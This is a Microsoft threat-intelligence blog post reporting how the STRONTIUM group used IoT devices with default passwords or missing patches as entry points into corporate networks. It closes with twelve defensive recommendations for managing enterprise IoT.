Corporate IoT – a path to intrusion
msrc-blog.microsoft.com/2019/08/05/corporate-iot-a-path-to-intrusion/

Several sources estimate that by the year 2020 some 50 billion IoT devices will be deployed
worldwide. IoT devices are purposefully designed to connect to a network and many are
simply connected to the internet with little management or oversight. Such devices still must
be identifiable, maintained, and monitored by security teams, especially in large complex
enterprises. Some IoT devices may even communicate basic telemetry back to the device
manufacturer or have means to receive software updates. In most cases however, the
customers’ IT operation center don’t know they exist on the network.
In 2016, the Mirai botnet was discovered by the malware research group MalwareMustDie.
The botnet initially consisted of IP cameras and basic home routers, two types of IoT devices
commonly found in the household. As more variants of Mirai emerged, so did the list IoT
devices it was targeting. The source code for the malware powering this botnet was
eventually leaked online.
In 2018, hundreds of thousands of home and small business networking and storage devices
were compromised and loaded with the so-called “VPN Filter” malware. The FBI has publicly
attributed this activity to a nation-state actor and took subsequent actions to disrupt this
botnet, although the devices would remain vulnerable to re-infection unless proper firmware
or security controls were put in place by the user.
There were also multiple press reports of cyber-attacks on several devices during the
opening ceremonies for the 2018 Olympic Games in PyeongChang. Officials did confirm a
few days later that they were a victim of malicious cyber-attacks that prevented attendees
from printing their tickets to the Games and televisions and internet access in the main press
center simply stopped working.

Three IoT devices
In April, security researchers in the Microsoft Threat Intelligence Center discovered
infrastructure of a known adversary communicating to several external devices. Further
research uncovered attempts by the actor to compromise popular IoT devices (a VOIP
phone, an office printer, and a video decoder) across multiple customer locations. The
investigation uncovered that an actor had used these devices to gain initial access to
corporate networks. In two of the cases, the passwords for the devices were deployed
without changing the default manufacturer’s passwords and in the third instance the latest
security update had not been applied to the device.
These devices became points of ingress from which the actor established a presence on the
network and continued looking for further access. Once the actor had successfully
established access to the network, a simple network scan to look for other insecure devices
allowed them to discover and move across the network in search of higher-privileged
accounts that would grant access to higher-value data. After gaining access to each of the
IoT devices, the actor ran tcpdump to sniff network traffic on local subnets. They were also
seen enumerating administrative groups to attempt further exploitation. As the actor moved
from one device to another, they would drop a simple shell script to establish persistence on
the network which allowed extended access to continue hunting. Analysis of network traffic
showed the devices were also communicating with an external command and control (C2)
server.

Attribution
We attribute the attacks on these customers using three popular IoT devices to an activity
group that Microsoft refers to as STRONTIUM. Since we identified these attacks in the early
stages, we have not been able to conclusively determine what STRONTIUM’s ultimate
objectives were in these intrusions.
Over the last twelve months, Microsoft has delivered nearly 1400 nation-state notifications to
those who have been targeted or compromised by STRONTIUM. One in five notifications of
STRONTIUM activity were tied to attacks against non-governmental organizations, think
tanks, or politically affiliated organizations around the world. The remaining 80% of
STRONTIUM attacks have largely targeted organizations in the following sectors:
government, IT, military, defense, medicine, education, and engineering. We have also
observed and notified STRONTIUM attacks against Olympic organizing committees, antidoping agencies, and the hospitality industry. The “VPN Filter” malware has also been
attributed to STRONTIUM by the FBI.

Call to action
Today we are sharing this information to raise awareness of these risks across the industry
and calling for better enterprise integration of IoT devices, particularly the ability to monitor
IoT device telemetry within enterprise networks. Today, the number of deployed IoT devices
outnumber the population of personal computers and mobile phones, combined. With each
networked IoT device having its own separate network stack, it’s quite easy to see the need
for better enterprise management, especially in today’s “bring your own device” world.
While much of the industry focuses on the threats of hardware implants, we can see in this
example that adversaries are happy to exploit simpler configuration and security issues to
achieve their objectives. These simple attacks taking advantage of weak device
management are likely to expand as more IoT devices are deployed in corporate
environments. Upon conclusion of our investigation, we shared this information with the
manufacturers of the specific devices involved and they have used this event to explore new
protections in their products. However, there is a need for broader focus across IoT in
general, both from security teams at organizations that need to be more aware of these

types of threats, as well as from IoT device makers who need to provide better enterprise
support and monitoring capabilities to make it easier for security teams to defend their
networks.

Recommendations for Securing Enterprise IoT
There are additional steps an organization can take to protect their infrastructure and
network from similar activity. Microsoft recommends the following actions to better secure
and manage risk associated with IoT devices:
1. Require approval and cataloging of any IoT devices running in your corporate
environment.

2. Develop a custom security policy for each IoT device.
3. Avoid exposing IoT devices directly to the internet or create custom access controls to
limit exposure.
4. Use a separate network for IoT devices if feasible.
5. Conduct routine configuration/patch audits against deployed IoT devices.
6. Define policies for isolation of IoT devices, preservation of device data, ability to
maintain logs of device traffic, and capture of device images for forensic investigation.
7. Include IoT device configuration weaknesses or IoT-based intrusion scenarios as part
of Red Team testing.
8. Monitor IoT device activity for abnormal behavior (e.g. a printer browsing SharePoint
sites…).
9. Audit any identities and credentials that have authorized access to IoT devices, users
and processes.
10. Centralize asset/configuration/patch management if feasible.
11. If your devices are deployed/managed by a 3rd party, include explicit Terms in your
contracts detailing security practices to be followed and Audits that report security
status and health of all managed devices.
12. Where possible, define SLA Terms in IoT device vendor contracts that set a mutually
acceptable window for investigative response and forensic analysis to any compromise
involving their product.
This case is one of several examples that Eric Doerr will present at Black Hat, on August 8,
2019, where Microsoft is calling for greater industry transparency to ensure that defenders
are best equipped to respond to threats from well-resourced adversaries.
